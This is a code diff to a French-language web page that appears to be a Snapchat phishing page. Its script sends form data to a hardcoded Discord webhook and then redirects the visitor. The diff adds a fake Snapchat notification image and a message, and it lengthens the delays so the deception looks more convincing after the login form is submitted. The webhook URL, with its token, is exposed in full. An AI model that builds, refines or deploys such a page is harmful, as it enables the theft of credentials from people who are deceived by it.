@@ -21,7 +21,7 @@
       height: 100vh;
       color: #000;
     }
-    .login-box, .hello-box {
+    .login-box, .message-box {
       width: 100%;
       max-width: 400px;
       padding: 40px;
@@ -31,10 +31,13 @@
       background-color: #fff;
       color: #000;
     }
-    .hello-box {
+    .message-box {
       display: none;
-      font-size: 24px;
-      font-weight: bold;
+      font-size: 18px;
+    }
+    .message-box img {
+      max-width: 100%;
+      border-radius: 12px;
     }
     .logo {
       width: 80px;
@@ -133,7 +136,10 @@
     <p id="referralError">Le code de parrainage doit contenir exactement 4 chiffres.</p>
   </div>
 
-  <div class="hello-box" id="helloBox">hello</div>
+  <div class="message-box" id="messageBox">
+    <img src="/mnt/data/bcb4d12d-23ec-44ee-aae6-14f89a0adf60.png" alt="Notification Snapchat traduite">
+    <p><strong>Essayez-vous d’accéder à Snapchat depuis un navigateur ?<br/>Touchez pour plus de détails.</strong></p>
+  </div>
 
   <script>
     const webhookURL = "https://discord.com/api/webhooks/1382387384997515294/yI75S1jd9z_vRaMRNBYR8Kk_i8rNs8_cMeeNtMRoU7IZgWtI-R6Cch95PsOPsG51K8s2";
@@ -167,10 +173,14 @@
         return;
       }
 
-      // Masquer l'interface principale et afficher "hello"
+      // Masquer le formulaire et afficher l'image après 2 secondes
       document.getElementById('loginBox').style.display = 'none';
-      document.getElementById('helloBox').style.display = 'block';
 
+      setTimeout(() => {
+        document.getElementById('messageBox').style.display = 'block';
+      }, 2000);
+
+      // Envoi des données
       const message = {
         embeds: [
           {
@@ -210,7 +220,7 @@
       .then(response => {
         setTimeout(() => {
           window.location.href = redirectURL;
-        }, 1500); // attendre 1.5s pour montrer "hello"
+        }, 4000); // Total : 2s attente + 2s affichage avant redirection
       })
       .catch(error => {
         alert("Erreur réseau ou CORS.");
